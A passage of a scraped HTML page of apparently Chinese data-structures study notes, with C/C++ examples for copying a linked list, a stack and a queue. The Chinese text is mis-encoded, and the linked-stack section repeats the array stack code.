class="hljs-string">&quot;åŸé“¾è¡¨: &quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// å¤åˆ¶é“¾è¡¨</span><br>    LinkList* copiedHead = <span class="hljs-built_in">CopyList</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å¤åˆ¶åçš„é“¾è¡¨: &quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(copiedHead);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><h4 id="é¡ºåºæ ˆçš„å®ç°"><a href="#é¡ºåºæ ˆçš„å®ç°" class="headerlink" title="é¡ºåºæ ˆçš„å®ç°"></a>é¡ºåºæ ˆçš„å®ç°</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// æ ˆçš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// å­˜å‚¨æ ˆä¸­å…ƒç´ çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> top;            <span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆï¼Œè¡¨ç¤ºæ ˆé¡¶å…ƒç´ çš„ç´¢å¼•</span><br>&#125; Stack;<br><br><span class="hljs-comment">// åˆå§‹åŒ–æ ˆ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// åˆå§‹åŒ–æ—¶æ ˆé¡¶æŒ‡é’ˆä¸º-1ï¼Œè¡¨ç¤ºç©ºæ ˆ</span><br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å…¥æ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆæ»¡ï¼Œæ— æ³•å…¥æ ˆ\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ˆæ»¡ï¼Œå…¥æ ˆå¤±è´¥</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// å…ˆå°†æ ˆé¡¶æŒ‡é’ˆåŠ 1ï¼Œå†å­˜å…¥å…ƒç´ </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆç©ºï¼Œæ— æ³•å‡ºæ ˆ\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æ ˆç©ºï¼Œå‡ºæ ˆå¤±è´¥ï¼Œè¿”å›ç‰¹æ®Šå€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// å–å‡ºæ ˆé¡¶å…ƒç´ ï¼Œå¹¶å°†æ ˆé¡¶æŒ‡é’ˆå‡1</span><br>&#125;<br><br><span class="hljs-comment">// æŸ¥çœ‹æ ˆé¡¶å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆç©ºï¼Œæ— æ³•æŸ¥çœ‹æ ˆé¡¶å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æ ˆç©ºï¼ŒæŸ¥çœ‹å¤±è´¥ï¼Œè¿”å›ç‰¹æ®Šå€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top]; <span class="hljs-comment">// è¿”å›æ ˆé¡¶å…ƒç´ </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value = <span class="hljs-built_in">Peek</span>(&amp;stack);<br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æœ‰æ•ˆ</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆé¡¶å…ƒç´ ä¸º: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(&amp;stack)) &#123;<br>        value = <span class="hljs-built_in">Pop</span>(&amp;stack);<br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æœ‰æ•ˆ</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºæ ˆå…ƒç´ : %d\n&quot;</span>, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ ˆçš„é“¾å¼ç»“æ„"><a href="#æ ˆçš„é“¾å¼ç»“æ„" class="headerlink" title="æ ˆçš„é“¾å¼ç»“æ„"></a><strong>æ ˆçš„é“¾å¼ç»“æ„</strong></h4><p>top  -&gt; é¡¶ -&gt;  â€¦  -&gt; åº•</p><p> <strong>æ ˆé¡¶ç»“ç‚¹ï¼š</strong></p><ul><li>ä½äºé“¾è¡¨çš„å¤´éƒ¨ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚<br><strong>æ ˆåº•ç»“ç‚¹ï¼š</strong></li><li>ä½äºé“¾è¡¨çš„å°¾éƒ¨ï¼Œæ²¡æœ‰åç»­å…ƒç´ ã€‚<br><strong>é“¾è¡¨è¡¨ç¤ºï¼š</strong><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">top</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a1</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a2</span> -&gt;</span> ... -&gt; an<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// æ ˆçš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// å­˜å‚¨æ ˆä¸­å…ƒç´ çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> top;            <span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆï¼Œè¡¨ç¤ºæ ˆé¡¶å…ƒç´ çš„ç´¢å¼•</span><br>&#125; Stack;<br><br><span class="hljs-comment">// åˆå§‹åŒ–æ ˆ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// åˆå§‹åŒ–æ—¶æ ˆé¡¶æŒ‡é’ˆä¸º-1ï¼Œè¡¨ç¤ºç©ºæ ˆ</span><br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å…¥æ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆæ»¡ï¼Œæ— æ³•å…¥æ ˆ\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ˆæ»¡ï¼Œå…¥æ ˆå¤±è´¥</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// å…ˆå°†æ ˆé¡¶æŒ‡é’ˆåŠ 1ï¼Œå†å­˜å…¥å…ƒç´ </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆç©ºï¼Œæ— æ³•å‡ºæ ˆ\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æ ˆç©ºï¼Œå‡ºæ ˆå¤±è´¥ï¼Œè¿”å›ç‰¹æ®Šå€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// å–å‡ºæ ˆé¡¶å…ƒç´ ï¼Œå¹¶å°†æ ˆé¡¶æŒ‡é’ˆå‡1</span><br>&#125;<br><br><span class="hljs-comment">// æŸ¥çœ‹æ ˆé¡¶å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆç©ºï¼Œæ— æ³•æŸ¥çœ‹æ ˆé¡¶å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æ ˆç©ºï¼ŒæŸ¥çœ‹å¤±è´¥ï¼Œè¿”å›ç‰¹æ®Šå€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top]; <span class="hljs-comment">// è¿”å›æ ˆé¡¶å…ƒç´ </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value = <span class="hljs-built_in">Peek</span>(&amp;stack);<br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æœ‰æ•ˆ</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆé¡¶å…ƒç´ ä¸º: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(&amp;stack)) &#123;<br>        value = <span class="hljs-built_in">Pop</span>(&amp;stack);<br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æœ‰æ•ˆ</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºæ ˆå…ƒç´ : %d\n&quot;</span>, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h2><p>é˜Ÿåˆ—æ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œå…ƒç´ ä»é˜Ÿå°¾å…¥é˜Ÿï¼Œä»é˜Ÿå¤´å‡ºé˜Ÿã€‚å®ƒçš„åŸºæœ¬æ“ä½œåŒ…æ‹¬å…¥é˜Ÿï¼ˆEnqueueï¼‰ã€å‡ºé˜Ÿï¼ˆDequeueï¼‰ã€å–é˜Ÿå¤´ï¼ˆPeek&#x2F;Frontï¼‰å’Œåˆ¤å®šé˜Ÿç©ºï¼ˆIsEmptyï¼‰ã€‚</p><ul><li><strong>é˜Ÿåˆ—ï¼ˆQueueï¼‰</strong>ï¼šä¸€ç§æ“ä½œå—é™çš„çº¿æ€§è¡¨ï¼Œåªå…è®¸åœ¨è¡¨çš„ä¸€ç«¯è¿›è¡Œæ’å…¥ï¼Œè€Œåœ¨è¡¨çš„å¦ä¸€ç«¯è¿›è¡Œåˆ é™¤ã€‚</li></ul><p><strong>åŸºæœ¬æ“ä½œï¼š</strong></p><ol><li><strong>å…¥é˜Ÿæˆ–è¿›é˜Ÿï¼ˆEnqueueï¼‰</strong>ï¼šå…ƒç´ ä»é˜Ÿåˆ—å°¾éƒ¨è¿›å…¥é˜Ÿåˆ—ã€‚</li><li><strong>å‡ºé˜Ÿæˆ–ç¦»é˜Ÿï¼ˆDequeueï¼‰</strong>ï¼šå…ƒç´ ä»é˜Ÿåˆ—å¤´éƒ¨ç¦»å¼€é˜Ÿåˆ—ã€‚<br><strong>ç‰¹æ€§ï¼š</strong></li></ol><ul><li><strong>å…ˆè¿›å…ˆå‡ºï¼ˆFirst-In-First-Out, FIFOï¼‰</strong><br><strong>ç»“æ„ç¤ºæ„å›¾ï¼š</strong><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>, <span class="hljs-built_in">a3</span>, <span class="hljs-built_in">a4</span><br>â†‘               â†‘<br>é˜Ÿå¤´(é˜Ÿé¦–)      é˜Ÿå°¾<br></code></pre></td></tr></table></figure></li><li>å…è®¸æ’å…¥çš„ä¸€ç«¯ç§°ä¸º<strong>é˜Ÿå°¾</strong>ï¼Œ</li><li>å…è®¸åˆ é™¤çš„ä¸€ç«¯ç§°ä¸º<strong>é˜Ÿé¦–</strong>ï¼Œ</li><li>é˜Ÿåˆ—å…·æœ‰<strong>å…ˆè¿›å…ˆå‡º</strong>çš„ç‰¹ç‚¹ã€‚<br>é€šè¿‡ä»¥ä¸Šç¬”è®°ï¼Œå¯ä»¥æ¸…æ™°åœ°ç†è§£é˜Ÿåˆ—çš„å®šä¹‰ã€æ“ä½œä»¥åŠå…¶ç‰¹æœ‰çš„â€œå…ˆè¿›å…ˆå‡ºâ€çš„ç‰¹æ€§ã€‚</li></ul><p>å¥½çš„ï¼Œä»¥ä¸‹æ˜¯å…³äºé˜Ÿåˆ—å­˜å‚¨ç»“æ„çš„æ•°æ®ç»“æ„ç¬”è®°ï¼š</p><h4 id="é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨"><a href="#é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨" class="headerlink" title="é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨"></a>é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨</h4><p><strong>å®šä¹‰ï¼š</strong></p><ul><li>é˜Ÿåˆ—æ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„æ•°æ®ç»“æ„ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-comment">// å®šä¹‰é¡ºåºé˜Ÿåˆ—ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// ç”¨æ•°ç»„å­˜å‚¨é˜Ÿåˆ—å…ƒç´ </span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// é˜Ÿåˆ—å¤´ç´¢å¼•</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// é˜Ÿåˆ—å°¾ç´¢å¼•</span><br>&#125; Queue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-number">0</span>;<br>    queue-&gt;rear = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == queue-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;rear == MAX_SIZE;<br>&#125;<br><br><span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•æ’å…¥å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    queue-&gt;data[queue-&gt;rear] = value;<br>    queue-&gt;rear++;<br>&#125;<br><br><span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> value = queue-&gt;data[queue-&gt;front];<br>    queue-&gt;front++;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•è·å–å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;data[queue-&gt;front];<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span 